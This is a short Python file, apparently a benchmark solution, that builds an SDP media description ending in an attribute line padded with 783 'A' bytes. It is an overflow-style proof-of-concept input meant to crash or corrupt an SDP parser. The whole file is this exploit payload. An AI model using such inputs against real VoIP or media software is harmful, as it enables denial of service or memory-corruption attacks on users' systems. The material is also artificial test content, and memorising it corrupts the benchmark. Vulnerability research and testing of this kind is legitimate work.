class Solution:
    def solve(self, src_path: str) -> bytes:
        prefix = b"v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\nm=audio 9 RTP/AVP 0\r\na=rtpmap:0 PCMU/8000\r\na="
        payload = b"A" * 783
        suffix = b"\r\n"
        return prefix + payload + suffix